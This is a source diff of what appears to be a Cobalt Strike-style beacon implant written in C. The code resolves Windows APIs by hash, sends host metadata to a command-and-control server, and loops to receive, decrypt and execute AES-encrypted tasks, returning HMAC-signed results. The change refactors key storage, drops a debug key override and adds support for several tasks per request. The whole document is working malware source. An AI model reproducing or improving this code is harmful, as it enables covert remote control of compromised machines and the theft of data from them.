@@ -37,6 +37,7 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 		Ins.api.wcslen              = PeGetFuncEat( Ntl, H_WCSLEN );
 		Ins.api.GetACP              = PeGetFuncEat( K32, H_GETACP );
 		Ins.api.wcsrchr             = PeGetFuncEat( Ntl, H_WCSRCHR );
+		Ins.api.SleepEx             = PeGetFuncEat( K32, H_SLEEPEX );
 		Ins.api.wcstombs            = PeGetFuncEat( Ntl, H_WCSTOMBS );
 		Ins.api.GetOEMCP            = PeGetFuncEat( K32, H_GETOEMCP );
 		Ins.api.LocalLock           = PeGetFuncEat( K32, H_LOCALLOCK );
@@ -137,9 +138,9 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 		{
 			if ( CryptRsaInit( &Ins ) )
 			{
-				if ( Ins.api.CryptGenRandom( Ins.key[0].Provider, 16, Ins.BeaconKeys ) )
+				if ( Ins.api.CryptGenRandom( Ins.key[0].Provider, 16, Ins.ctx.BeaconKeys ) )
 				{
-					if ((Ins.BeaconId = RandomNumber32( &Ins )))
+					if ((Ins.ctx.BeaconId = RandomNumber32( &Ins )))
 					{
 						PVOID                Cmp = 0;
 						PVOID                Usr = 0;
@@ -160,12 +161,10 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 									{
 										if ((Hdr = BufferCreate( &Ins, sizeof( BEACON_METADATA_HDR ))))
 										{
-											memset( Ins.BeaconKeys, 'A', 16 );
-											Hdr = BufferAddRaw( &Ins, Hdr, Ins.BeaconKeys, 16 );
-
+											Hdr = BufferAddRaw( &Ins, Hdr, Ins.ctx.BeaconKeys, 16 );
 											Hdr = BufferAddUI2( &Ins, Hdr, Ins.api.GetACP());
 											Hdr = BufferAddUI2( &Ins, Hdr, Ins.api.GetOEMCP());
-											Hdr = BufferAddUI4( &Ins, Hdr, HTONL(Ins.BeaconId) );
+											Hdr = BufferAddUI4( &Ins, Hdr, HTONL(Ins.ctx.BeaconId) );
 											Hdr = BufferAddUI4( &Ins, Hdr, HTONL(Ins.api.GetCurrentProcessId()) );
 											Hdr = BufferAddUI2( &Ins, Hdr, 0 );
 											#if defined( _WIN64 )
@@ -196,7 +195,7 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 													if ( TransportInit( &Ins ) )
 													{
 														if ( TransportSend( &Ins, Ecp, Ecl ) ) {
-															Ins.IsOnline = TRUE; Ins.LastTask++;
+															Ins.IsOnline = TRUE; Ins.ctx.LastTask++;
 														} else TransportFree( &Ins );
 													};
 													Ins.api.LocalFree( Ecp );
@@ -228,7 +227,7 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 
 		if ( Ins.IsOnline != FALSE )
 		{
-			if ((Sum = Sha256Sum( &Ins, Ins.BeaconKeys, 16 )))
+			if ((Sum = Sha256Sum( &Ins, Ins.ctx.BeaconKeys, 16 )))
 			{
 				struct
 				{
@@ -265,6 +264,8 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 						{
 							PBEACON_TASK_RES_HDR ResHdr     = NULL;
 							PBEACON_TASK_ENC_HDR EncHdr     = NULL;
+							PBEACON_TASK_REQ_HDR ReqHdr     = NULL;
+							PBEACON_TASK_REQ_BUF ReqBuf     = NULL;
 							PVOID                TskPtr     = NULL;
 							PVOID                TxtBuf     = NULL;
 							PVOID                AesBuf     = NULL;
@@ -273,51 +274,54 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 							UCHAR                NopBuf     = 0;
 							UCHAR                MacSum[32] = { 0 };
 							ULONG                MacLen     = 0;
+							ULONG                uIndex     = 0;
 							BOOL                 IsSent     = FALSE;
 
 							if ( TransportRecv( &Ins, &TxtBuf, &TxtLen ) )
 							{
 								if ( !( TxtLen % 16 ) )
 								{
-									if ( CryptAesDecrypt( &Ins, TxtBuf, TxtLen ) )
+									if ( CryptAesDecrypt( &Ins, TxtBuf, TxtLen - 16 ) )
 									{
-										if ((TskPtr = BeaconTask( &Ins, CPTR( TxtBuf ) )))
+										ReqHdr = CPTR( UPTR( TxtBuf ) );
+										ReqBuf = CPTR( UPTR( ReqHdr->Buffer ) );
+
+										for ( ; ( ReqHdr->Length >= ( UPTR( ReqBuf ) - UPTR( ReqHdr ) ) ) ; )
 										{
-											if (( ResHdr = Ins.api.LocalLock( TskPtr )))
+											if ((TskPtr = BeaconTask( &Ins, CPTR( ReqBuf ) )))
 											{
-												if ( CryptAesEncrypt( &Ins, ResHdr, ResHdr->Length + 8, &AesBuf, &AesLen ) )
+												if (( ResHdr = Ins.api.LocalLock( TskPtr )))
 												{
-													if (( EncHdr = Ins.api.LocalAlloc( LPTR, 4 + AesLen + 16 )))
+													if ( CryptAesEncrypt( &Ins, ResHdr, ResHdr->Length + 8, &AesBuf, &AesLen ) )
 													{
-														memset( EncHdr->Buffer, 0, AesLen );
-														memcpy( EncHdr->Buffer, AesBuf, AesLen );
-
-														if ( CryptHmacHash( &Ins,
-																    EncHdr->Buffer,
-																    AesLen,
-																    MacSum ))
+														if (( EncHdr = Ins.api.LocalAlloc( LPTR, 4 + AesLen + 16 )))
 														{
-															EncHdr->Length = AesLen + 16;
-															memcpy( &EncHdr->Buffer[AesLen], MacSum, 16 );
+															memset( EncHdr->Buffer, 0, AesLen );
+															memcpy( EncHdr->Buffer, AesBuf, AesLen );
 
-															if ( TransportSend( &Ins, EncHdr, 4 + AesLen + 16 ) )
+															if ( CryptHmacHash( &Ins, EncHdr->Buffer, AesLen, MacSum ))
 															{
-																IsSent = TRUE;
+																EncHdr->Length = AesLen + 16;
+																memcpy( &EncHdr->Buffer[AesLen], MacSum, 16 );
+
+																if ( TransportSend( &Ins, EncHdr, 4 + AesLen + 16 ) )
+																{
+																	IsSent = TRUE;
+																};
 															};
+															Ins.api.LocalFree( EncHdr );
 														};
-														Ins.api.LocalFree( EncHdr );
+														Ins.api.LocalFree( AesBuf );
 													};
-													Ins.api.LocalFree( AesBuf );
+													Ins.api.LocalUnlock( TskPtr );
 												};
-												Ins.api.LocalUnlock( TskPtr );
+												Ins.api.LocalFree( TskPtr );
 											};
-											Ins.api.LocalFree( TskPtr );
+											ReqBuf = CPTR( UPTR( ReqBuf->Buffer ) + ReqBuf->ArgLength );
 										};
 									};
 								};
-								if ( IsSent != TRUE )
-									TransportSend( &Ins, &NopBuf, 1 );
-
+								IsSent ? : TransportSend( &Ins, &NopBuf, 1 );
 								Ins.api.LocalFree( TxtBuf );
 							};
 						} while ( Ins.IsOnline != FALSE );
